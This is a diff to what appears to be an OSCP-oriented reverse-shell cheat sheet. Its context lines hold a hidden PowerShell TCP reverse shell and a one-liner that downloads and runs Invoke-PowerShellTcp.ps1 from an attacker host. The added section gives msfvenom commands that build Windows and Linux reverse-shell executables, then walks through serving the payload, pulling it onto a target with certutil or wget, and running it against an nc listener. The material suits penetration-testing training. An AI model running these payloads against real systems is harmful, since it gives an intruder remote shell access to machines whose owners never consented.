@@ -167,3 +167,25 @@ powershell -nop -w hidden -c "$c=New-Object System.Net.Sockets.TCPClient('{{LHOS
 > ```powershell
 > IEX(New-Object Net.WebClient).DownloadString('http://{{LHOST}}/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress {{LHOST}} -Port {{LPORT}}
 > ```
+
+### Standalone payloads (msfvenom)
+
+> `shell_reverse_tcp` = **plain** (non-staged, non-Meterpreter) reverse shell — catch it with
+> the same `nc -lvnp {{LPORT}}` listener above, no `multi/handler` needed. Meterpreter payloads
+> carry the same OSCP restriction as Metasploit itself, so stick to `shell_reverse_tcp` here.
+
+```bash
+# Windows — .exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f exe -o shell.exe
+# Windows 32-bit target
+msfvenom -p windows/shell_reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f exe -o shell.exe
+
+# Linux — ELF
+msfvenom -p linux/x64/shell_reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f elf -o shell.elf
+# Linux 32-bit target
+msfvenom -p linux/x86/shell_reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f elf -o shell.elf
+```
+
+> Serve the payload (`python3 -m http.server 80`), pull it onto the target (`certutil`/`wget`),
+> mark it executable on Linux (`chmod +x shell.elf`), then run it while your `nc` listener waits.
+> List payloads/formats: `msfvenom --list payloads` · `msfvenom --list formats`.
